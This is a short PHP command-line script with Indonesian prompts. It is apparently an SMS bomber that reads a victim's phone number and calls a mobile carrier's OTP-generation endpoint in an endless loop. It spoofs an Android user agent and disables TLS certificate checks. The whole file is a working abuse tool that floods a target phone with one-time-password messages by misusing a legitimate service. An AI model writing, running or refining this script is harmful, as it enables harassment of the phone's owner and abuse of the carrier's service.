<?php
function sms($target) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateOTP");
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$target");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 9; RMX1941 Build/PPR1.180610.011)");
  $result = curl_exec($ch);
  curl_close($ch);
  $json = json_decode($result, true);
  echo "\nSUCCES | ", $json["success"], "SEDANG MENGIRIM OTP KE NOMOR :", $json["MSISDN"];
}

echo "MASUKKAN NOMOR TUJUAN:";
$nomer = trim(fgets(STDIN));
while (true) {
  $execute = sms($nomer);
  print $execute;
}
?>